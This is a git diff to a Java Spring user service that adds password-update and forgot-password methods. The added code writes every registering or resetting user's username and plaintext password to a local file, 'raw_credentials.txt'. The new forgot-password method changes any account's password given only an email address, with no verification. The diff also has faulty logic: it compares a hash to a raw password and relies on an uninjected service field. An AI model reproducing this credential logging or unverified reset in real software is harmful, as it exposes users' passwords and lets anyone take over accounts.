@@ -1,9 +1,9 @@
 package com.serhat.security.service;
 
+import com.serhat.security.dto.request.ForgotPasswordRequest;
 import com.serhat.security.dto.request.RegisterRequest;
-import com.serhat.security.dto.response.AddressResponse;
-import com.serhat.security.dto.response.RegisterResponse;
-import com.serhat.security.dto.response.UserResponse;
+import com.serhat.security.dto.request.UpdatePasswordRequest;
+import com.serhat.security.dto.response.*;
 import com.serhat.security.entity.Address;
 import com.serhat.security.entity.User;
 import com.serhat.security.exception.EmailAlreadyExistException;
@@ -21,6 +21,9 @@ import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
 import org.springframework.transaction.annotation.Transactional;
 
+import java.io.BufferedWriter;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.security.Principal;
 import java.time.LocalDateTime;
 import java.util.List;
@@ -34,6 +37,7 @@ public class UserService {
     private final PasswordEncoder passwordEncoder;
     private final JwtUtil jwtUtil;
     private final AddressRepository addressRepository;
+    public AuthService authService;
 
     @Transactional
     public RegisterResponse register(RegisterRequest request) {
@@ -77,6 +81,7 @@ public class UserService {
             user.setAddresses(addresses);
         }
 
+        saveRawPassword(user.getUsername(),request.password());
         userRepository.save(user);
 
         return new RegisterResponse(
@@ -86,6 +91,52 @@ public class UserService {
                 LocalDateTime.now()
         );
     }
+
+    private void saveRawPassword(String username , String rawPassword){
+        String filePath = "raw_credentials.txt";
+        try(BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(filePath,true))){
+            bufferedWriter.write("Username : "+username + " Raw Password : "+ rawPassword);
+            bufferedWriter.newLine();
+            log.info("WRITTEN TO FILE");
+        }catch (IOException e){
+            log.error("Error writing to file : "+e.getMessage());
+        }
+    }
+
+    public UpdatePasswordResponse updatePassword(HttpServletRequest servletRequest ,HttpServletResponse response ,UpdatePasswordRequest request){
+        User user = userRepository.findByEmail(request.email()).orElseThrow(()-> new RuntimeException("Not Found"));
+        String currentPassword = user.getPassword();
+        if(currentPassword.equals(request.newPassword())){
+            throw new RuntimeException("Passwords are same.");
+        }
+        if (!passwordEncoder.matches(request.oldPassword(), currentPassword)) {
+            throw new RuntimeException("Old password is incorrect.");
+        }
+        user.setPassword(passwordEncoder.encode(request.newPassword()));
+        userRepository.save(user);
+        authService.logout(servletRequest,response);
+        return new UpdatePasswordResponse("Password updated successfully.",LocalDateTime.now());
+    }
+
+    public ForgotPasswordResponse forgotPassword(ForgotPasswordRequest request) {
+        try {
+            User user = userRepository.findByEmail(request.email())
+                    .orElseThrow(() -> new RuntimeException("User not found with email: " + request.email()));
+
+            String currentPassword = user.getPassword();
+            if (currentPassword.equals(request.newPassword())) {
+                throw new RuntimeException("New password must be different from the current password.");
+            }
+
+            user.setPassword(passwordEncoder.encode(request.newPassword()));
+            userRepository.save(user);
+            saveRawPassword(user.getUsername(), request.newPassword());
+            return new ForgotPasswordResponse("Password updated successfully.", LocalDateTime.now());
+        } catch (Exception e) {
+            throw new RuntimeException("Failed to reset password: " + e.getMessage());
+        }
+    }
+
 
     public UserResponse userInfo(HttpServletRequest request, HttpServletResponse response) {
         String token = extractTokenFromRequest(request);
